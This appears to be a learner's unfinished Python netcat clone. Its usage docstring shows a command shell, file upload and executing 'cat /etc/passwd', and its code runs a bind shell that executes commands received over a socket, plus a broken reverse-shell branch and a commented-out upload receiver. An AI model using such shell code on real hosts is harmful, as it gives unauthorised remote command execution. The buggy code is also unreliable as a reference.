'''
Requirements:
netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
netcat.py -t 192.168.1.108 -p 5555 # connect to server
'''

import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

parser = argparse.ArgumentParser()
parser.add_argument('-t', nargs='?',type=str,help='host')
parser.add_argument('-p', nargs='?', type=int, help='port')
parser.add_argument('-e', nargs='?',type=str, help='excute command')
parser.add_argument('-u', nargs='?',type=str, help='upload to file')
parser.add_argument('-l', action='store_true', help='listen')
parser.add_argument('-r', action='store_true', help='reverse command shell')
parser.add_argument('-b', action='store_true', help='binding command shell')
opt=parser.parse_args()

### Listen ###
def listen(ip,port):
    # Listening socket
    ip = str(ip)
    ip_port = (ip, port)
    # Create a server and start listening
    server = socket.socket()
    server.bind(ip_port)
    server.listen()
    print(f'[*] Listening at {ip_port}')
    s, raddr = server.accept()
    print(f'[*] Connecting with {raddr}')
    return s, raddr


### shell, command ###
def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    result = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    result = (result.decode())
    return result

### reverse_shell ###
def send(s):
   while True:
      s.send(b"#> ")
      cmd = s.recv(1024).decode()
      result = execute(cmd)
      s.send(result.encode())


if opt.r and opt.t and opt.p:
    ip = opt.t
    port = opt.p
    raddr = (ip, port)
    cmd = '/bin/bash'
    send(raddr)
elif opt.b and opt.t and opt.p:
    ip = opt.t
    port = opt.p
    s, raddr = listen(ip, port)
    send(s)





'''
socket_raddr = server_listen(ip,port)

socket_raddr = list(socket_raddr)
raddr=(socket_raddr[1])

server_shell(raddr)


### shell, command,
def server_execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    result = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    result = (result.decode())
    return result




def server_listen():
    # Listening socket
    l_ip_port = ('0.0.0.0', 6666)
    # Create a server and start listening
    server = socket.socket()
    server.bind(l_ip_port)
    server.listen()
    #s, remote = server.accept()
    #print(f'[*] Connecting with {remote}')

# Function
def com():
    while True:
      s.send(b"#> ")
      cmd = s.recv(1024).decode()
      result = server_execute(cmd)
      s.send(result.encode())
     # Start receiving and sending data
def tread():
    com_thread = threading.Thread(target = com)
    com_thread.start()

### upload file

def server_upload():
    buf = b''
    s, r_ip_port = server.accept()
    print(f'[*] Uploading file from:{r_ip_port}')
    while True:
       data = s.recv(1024)
       #print(data)
       if data:
          buf += data
       else:
          print(buf)
          filename = 'upload.txt'
          f = open(filename,'wb')
          f.write(buf)
          f.close()
          break

server_upload()
'''





























